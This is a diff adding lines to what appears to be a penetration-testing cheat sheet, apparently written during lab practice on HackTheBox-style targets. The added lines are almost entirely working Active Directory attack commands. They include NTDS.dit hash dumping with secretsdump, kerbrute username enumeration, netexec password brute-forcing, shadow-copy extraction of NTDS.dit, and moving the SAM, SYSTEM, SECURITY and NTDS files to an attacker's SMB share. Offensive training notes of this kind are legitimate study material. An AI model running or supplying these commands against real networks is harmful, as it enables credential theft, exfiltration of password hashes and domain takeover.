@@ -706,6 +706,12 @@ secretsdump.py <DOMAIN>/<USER>:<PASS>@<TARGET_IP>
 secretsdump.py -hashes <LM_HASH>:<NTLM_HASH> <DOMAIN>/<USER>@<TARGET_IP>
 netexec smb <TARGET_IP> -u user -p pass --sam
 netexec smb <TARGET_IP> -u user -p pass -M lsassy
+
+
+#ntds hash dump
+impacket-secretsdump \
+-ntds NTDS.dit \
+-system SYSTEM LOCAL
 ```
 
 ### Windows PrivEsc Decision Tree
@@ -916,6 +922,28 @@ kerbrute passwordspray -d corp.local --dc 192.168.x.100 \
     domain_users.txt 'Password123'
 kerbrute passwordspray -d corp.local --dc 192.168.x.100 \
     domain_users.txt 'Corp2024!'
+
+#username enum 
+./kerbrute_linux_amd64 userenum \
+--dc 10.129.201.57 \
+--domain inlanefreight.local \
+names.txt                   
+
+
+#password attack netsex
+netexec smb 10.129.201.57 \
+-u bwilliamson \
+-p /usr/share/wordlists/fasttrack.txt
+
+
+#create snap shot
+vssadmin CREATE SHADOW /For=C:
+
+#copy ntds eesnure copy path is valid
+cmd.exe /c copy \
+\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit \
+c:\NTDS\NTDS.dit
+
 
 # Common patterns to try (1 pass per spray, wait between rounds):
 # Password123, Welcome1, Summer2024!, Corp2024!, Company@123
@@ -1688,6 +1716,23 @@ copy Z:\file.exe C:\Temp\
 # SMB (upload to attacker's share):
 # Attacker: impacket-smbserver share . -smb2support -username user -password pass
 copy C:\Windows\System32\config\SAM \\<LHOST>\share\SAM
+
+#if evil-win authenticate first
+net use \\10.10.15.201\share /user:user pass
+cmd.exe /c move SAM \\IP\share\
+cmd.exe /c move SECURITY \\''\share\
+cmd.exe /c move SYSTEM \\''\share\
+cmd.exe /c move NTDS.dit \\''\share\
+
+#fatser method get ntds hash 
+netexec smb 10.129.201.57 \
+-u bwilliamson \
+-p P@55w0rd! \
+-M ntdsutil
+
+
+#copy multiple
+copy C:\Windows\System32\config\SAM C:\Windows\System32\config\SYSTEM C:\Windows\System32\config\SECURITY \\<LHOST>\share\
 
 # HTTP POST (if attacker has upload server):
 # Attacker: python3 uploadserver.py (pip install uploadserver)
